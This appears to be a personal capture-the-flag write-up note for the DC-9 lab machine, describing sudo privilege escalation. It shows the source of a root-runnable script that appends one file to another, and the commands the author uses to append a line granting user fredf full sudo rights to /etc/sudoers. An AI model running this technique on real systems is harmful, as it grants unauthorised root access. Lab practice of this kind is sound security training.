# Sudo

with the new found user fredf, sudo -l shows some option

![[Pasted image 20210505203813.png]]

found the "source" in the folder above

```
redf@dc-9:~$ cat /opt/devstuff/test.py                                                                                                                                                                           
#!/usr/bin/python                                                                                                                                                                                             

import sys                                                                                                                                                                                                        

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)
                                                                                                                                                                                                                  
else :                                                                                                                                                                                                            
    f = open(sys.argv[1], "r")
    output = (f.read())
    f = open(sys.argv[2], "a")                                                                                                                                                                               
    f.write(output)                                                                                                                                                                                           
    f.close()  
```

can append to files as sudo

```
fredf@dc-9:~$ echo 'fredf    ALL=(ALL:ALL) ALL' > 2.txt
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test 2.txt /etc/sudoers
```

![[Pasted image 20210505203617.png]]

